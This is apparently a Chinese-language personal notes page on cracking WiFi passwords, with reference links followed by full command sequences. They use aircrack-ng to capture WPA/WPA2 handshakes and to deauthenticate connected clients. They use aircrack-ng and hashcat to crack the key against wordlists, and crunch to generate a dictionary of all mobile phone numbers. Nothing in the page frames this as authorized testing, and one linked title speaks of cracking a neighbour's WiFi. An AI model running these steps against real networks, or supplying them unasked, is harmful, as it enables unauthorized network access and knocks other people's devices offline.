
> “WiFi 安全”

参考：

- [【Aircrack】Kali linux 下使用 Aircrack-ng 对于 wifi 暴力破解的使用教程](https://freeerror.org/d/161-kali-linux-aircrack-ng-wifi)
- [【Aircrack】Kali Linux使用Aircrack破解wifi密码(wpa_wpa2) - 罗道义 - 博客园](https://www.cnblogs.com/daoyi/p/Kali-Linux-shi-yongAircrack-po-jiewifi-mi-ma-wpawp.html)
- [【Aircrack】Kali破解wifi最基础版_运维_河南理工杨轻帆的博客-CSDN博客](https://blog.csdn.net/tangjikede2008/article/details/99758890)
- [【Aircrack】airodump-ng帮助手册翻译 - lim42 - 博客园](https://www.cnblogs.com/lim42/p/6887905.html)
- [【Crunch】Linux下的字典生成工具Crunch，创造自己的专属字典 - FreeBuf互联网安全新媒体平台](https://www.freebuf.com/sectool/170817.html)
- [【Crunch】crunch--字典生成工具 - wpjamer - 博客园](https://www.cnblogs.com/wpjamer/p/9913380.html)
- [【Crunch】crunch生成手机号 发个教程 55G吓人啊 - mljqqh - 博客园](https://www.cnblogs.com/mljqqh/p/10344507.html)
- [【Hashcat】cracking_wpawpa2 [hashcat wiki]](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)
- [【Hashcat】frequently_asked_questions [hashcat wiki]](https://hashcat.net/wiki/doku.php?id=frequently_asked_questions#overview)
- [【Hashcat】hashcat暴力破解密码 _ 忆杰的博客](https://www.joenchen.com/archives/1248)
- [【Hashcat】使用Hashcat跑Wifi密码 _ ohhink](https://ouhaohan8023.github.io/2019/08/22/Artisans/使用Hashcat跑Wifi密码/)
- [【Hashcat】用Hashcat每秒计算1.4亿个密码，破解隔壁WIFI密码 - 方方和圆圆 - 博客园](https://www.cnblogs.com/diligenceday/p/6359661.html)
- [【钓鱼】Hacking any WPA_WPA2 PSK without BruteForce - 简书](https://www.jianshu.com/p/2a19a8e5aee7)
- [隐藏wifi ssid获取 - 简书](https://www.jianshu.com/p/a86ae4ed102d)

## airmon-ng, airodump-ng, aireplay-ng, aircrack-ng 工具的使用

```sh
# 查看支持的网卡
airmon-ng

# 将网卡切换成监听模式
# wlan0 是网卡名称，开启后会在后面加上mon
airmon-ng start wlan0

# 扫描无线列表
airodump-ng wlan0mon

# 查看指定 BSSID 的详情
airodump-ng -d 08:1F:71:xx:xx:xx wlan0mon

# 抓握手包，在这里面包含加密的密码
airodump-ng -c 1 --bssid 08:1F:71:xx:xx:xx -w ~/wifi/ wlan0mon

# 攻击连接上该热点的客户端，让其掉线重连，以获取握手包
aireplay-ng -0 20 -a 08:1F:71:xx:xx:xx -c 04:33:85:xx:xx:xx wlan0mon

# 停止监听模式
airmon-ng stop wlan0mon

# 跑字典获取密码
aircrack-ng -a2 -b 08:1F:71:xx:xx:xx -w ~/baoli/rockyou.txt ~/wifi/*.cap 
```

## 使用 Hashcat 快速跑字典

Hashcat for windows: [hashcat-5.1.0.7z](https://hashcat.net/files/hashcat-5.1.0.7z) [hashcat-utils](https://github.com/hashcat/hashcat-utils/releases)

```
# 转换 cap 为 hccapx
cap2hccapx.exe 01.cap 01.hccapx

# 用 Hashcat 跑字典，支持 GPU 加速，其中指定 session 可以保存日志或进度
hashcat64.exe -m 2500 D:\test\01.hccapx D:\zd\word.txt  --session=whypie0
```

## 使用 Chrunch 生成任意字典

生成手机号，新建一个 `num.txt` 文件，内容为：

```
numeric = [345789]
```

然后让其生成，最后文件非常大，有 `72.6 GB`！：

```
crunch 11 11 -f ./num.txt numeric -t 1@%%%%%%%%% -o allPhones.txt
```
